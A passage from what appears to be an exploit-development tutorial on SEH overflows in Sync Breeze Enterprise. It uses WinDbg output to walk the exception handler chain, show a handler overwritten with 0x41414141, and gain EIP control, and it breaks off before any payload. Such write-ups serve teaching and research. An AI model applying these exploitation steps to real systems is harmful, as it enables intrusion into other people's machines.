+</span></span><span style="display:flex;"><span>    LastStatusValue:      <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>We see that it is near 0x0, which means that it is close to the base of the stack of the thread.
+Let&rsquo;s dump the first <code>_EXCEPTION_REGISTRATION_RECORD</code> structure at the memory address of the ExceptionList pointer.
+From the previous section, we know that the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure has two members. The first is Next and, as the name suggests, it points to the next entry in the singly-linked list. The second, Handler, is the memory address of the <code>_except_handler</code> function.
+We can manually walk the singly-linked list in the debugger as shown in the listing below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ff60
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00a0ffcc</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77308b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>We can iterate over the &ldquo;Next&rdquo; argument to see how much records there are in the stack. Let&rsquo;s do it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ff60
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00a0ffcc</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77308b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ffcc
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x00a0ffe4</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77308b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">00</span>a0ffe4
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0xffffffff</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x773163cf</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>FinalExceptionHandlerPad47<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>We see that the last member of the list has a &ldquo;Next&rdquo; pointer to 0xffffffff. This last record <strong>is the default exception handler specified by the OS, the one that ends the thread or program. Note that the associated <code>_EXCEPTION_DISPOSITION</code> value is different from the others!</strong></p>
+<p>Now, let&rsquo;s trigger the crash with the exploit again to see what happens during a SEH overflow.
+Once we send the exploit, let&rsquo;s walk the ExceptionList again. Oh, wait! the second <code>_EXCEPTION_REGISTRATION_RECORD</code> structure has been overwritten by our buffer!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090f</span>e0c
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0090ff44</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x1008df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x41414141</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">41414141</span>
+</span></span></code></pre></div><p>Note that <code>_EXCEPTION_REGISTRATION_RECORD</code> structures are pushed on the stack from first to last. Because of this, SEH overflows generally overwrite the last <code>_EXCEPTION_REGISTRATION_RECORD</code> structure first, as it is the nearest to reach.
+Keep in mind that in some cases, the overflow happens in such a way <strong>that the exception chain is only partially overwritten</strong>.</p>
+<p>The exception occurs because the application is trying to read and execute an unmapped memory page. This causes an access violation exception that needs to be handled by the application or the OS.</p>
+<p>Let&rsquo;s display all the exception handlers of the current thread with the !exchain extension:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>exchain
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span>e0c: libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">149f</span>b (<span style="color:#ae81ff">1008</span>df5b)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span>Invalid exception stack at <span style="color:#ae81ff">41414141</span>
+</span></span></code></pre></div><p>This little program which follows the exception chain tells us the same as our manual analysis: we have managed to overwrite an exception handler.</p>
+<p>For now, we know that the first step in the SEH overflow is to obtain the address of the first <code>_EXCEPTION_REGISTRATION_RECORD</code> structure from the TEB. Then the OS proceeds to call each of the <code>_exception_handler</code> functions until the exception has been handled, or crashes if no handler could deal with the exception.</p>
+<p>At this point, however, the address of at least one of the <code>_except_handler</code> functions has been overwritten by our buffer (<strong>0x41414141</strong>).
+This means that whenever this <code>_EXCEPTION_REGISTRATION_RECORD</code>structure is used to handle the exception, the CPU will end up calling 0x41414141, giving us control over the EIP register. This is exactly the behavior we noticed as part of the initial crash analysis. <strong>Note that the previous exceptions need to not be able to manage the exception, so that the exception handling mechanism manages to execute our function in order to try to handle the exception.</strong></p>
+<p>We can confirm this by resuming execution inserting &ldquo;g&rdquo; in WinDbg and let the application handle the exception, which leads us to see that EIP has been modified to point to our code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">938.1</span>d54)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
+</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
+</span></span><span style="display:flex;"><span>This exception may be expected and handled.
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">440</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41414141</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span>
+</span></span></code></pre></div><p>Let&rsquo;s inspect the call stack with the &ldquo;k&rdquo; command to see which functions were called before the EIP was overwritten:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> k
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># ChildEBP RetAddr  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>WARNING: Frame IP not in any known module. Following frames may be wrong.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">43</span>c <span style="color:#ae81ff">77316252</span> <span style="color:#ae81ff">0x41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span> <span style="color:#ae81ff">77316224</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">528</span> <span style="color:#ae81ff">77302</span>cb6 ntdll<span style="color:#f92672">!</span>ExecuteHandler<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">528</span> <span style="color:#ae81ff">10012</span>a9d ntdll<span style="color:#f92672">!</span>KiUserExceptionDispatcher<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span> <span style="color:#ae81ff">0090f</span>eb8 <span style="color:#ae81ff">00000000</span> libpal<span style="color:#f92672">!</span>SCA_ConfigObj<span style="color:#f92672">::</span>Deserialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span>
+</span></span></code></pre></div><p>The output indicates that ntdll!ExecuteHandler2 was called directly before we achieved code execution. As previously discussed, this function is responsible for calling the _except_handler functions registered on the stack. We’ll confirm this shortly.</p>
+<p>Okay, we have control over the instruction pointer, but we need to point it to our code. Let&rsquo;s see if any of the register points to our buffer. Also, let&rsquo;s inspect the stack frame to see if our payload is there:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dds esp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">440</span>  <span style="color:#ae81ff">77316252</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">444</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">448</span>  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">44</span>c  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">450</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>cc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">454</span>  <span style="color:#ae81ff">0090f</span>e0c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">458</span>  <span style="color:#ae81ff">77316270</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">45</span>c  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">528</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">464</span>  <span style="color:#ae81ff">77316224</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">468</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">46</span>c  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">470</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">474</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>cc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">478</span>  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">47</span>c  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">480</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">484</span>  <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">488</span>  <span style="color:#ae81ff">772</span>dd4db ntdll<span style="color:#f92672">!</span>RtlDispatchException<span style="color:#f92672">+</span><span style="color:#ae81ff">0x143</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">48</span>c  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">490</span>  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">494</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">498</span>  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>cc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">49</span>c  <span style="color:#ae81ff">41414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>a0  <span style="color:#ae81ff">0090f</span>b10
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>a4  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">08</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>a8  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">540</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>ac  <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>b0  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">55</span>c
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>b4  <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>b8  <span style="color:#ae81ff">00000032</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">4</span>bc  <span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> r
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">440</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0090f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010246</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">41414141</span> <span style="color:#f92672">??</span>              <span style="color:#f92672">???</span>
+</span></span></code></pre></div><p>According to the output in Listing 107, none of the registers point to our buffer at the moment we gain control over the execution. The ECX register is being overwritten alongside the instruction pointer while most of the other registers are NULL. We do not overwrite any data on the stack (which ESP and EBP point to). Lastly, EDX appears to point somewhere inside the ntdll!ExecuteHandler2 function.</p>
+<p>At this point, even if we control the instruction pointer, we are still not able to easily redirect the execution flow to our buffer where we’d eventually store a payload.</p>
+<p>Let&rsquo;s put a breakpoint in ntdll!ExecuteHandler2 to stop the execution before WinDbg intercepts the exception. Then, let&rsquo;s crash the application again, and skip the first call to ntdll!ExecuteHandler2, because <strong>the first exception handler has not been overwritten by us, and we want to go to the second exception handler.</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#ae81ff">16</span>cc.f30)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
+</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
+</span></span><span style="display:flex;"><span>This exception may be expected and handled.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">***</span> WARNING: Unable to verify checksum <span style="color:#66d9ef">for</span> C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libpal.dll
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span>a0c ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">08</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">9</span>c4 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">08</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span>b10
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>d2a9d esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">998</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span>eb8 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010206</span>
+</span></span><span style="display:flex;"><span>libpal<span style="color:#f92672">!</span>SCA_ConfigObj<span style="color:#f92672">::</span>Deserialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span>d2a9d ff5024          call    dword ptr [eax<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>h]  ds:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41414165</span><span style="color:#f92672">=????????</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> bp ntdll<span style="color:#f92672">!</span>ExecuteHandler2
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> g
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">7731622</span>c esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">464</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">528</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> g
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">7731622</span>c esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">464</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">528</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
